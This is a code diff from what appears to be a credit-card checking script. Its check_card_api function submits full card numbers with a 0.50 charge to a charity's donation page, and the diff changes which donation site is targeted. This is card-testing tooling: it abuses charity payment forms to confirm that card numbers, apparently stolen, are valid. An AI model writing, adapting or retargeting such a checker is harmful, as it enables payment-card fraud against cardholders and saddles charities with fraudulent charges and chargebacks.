@@ -32,7 +32,7 @@ async def get_bin_info(bin_number):
 # ------------------- Check API -------------------
 async def check_card_api(card_full):
     params = {
-        "url": "https://raybensch.com/donations/support-ray/",
+        "url": "https://www.wfft.org/donations/general-donation/",
         "card": card_full,
         "amount": 0.50
     }
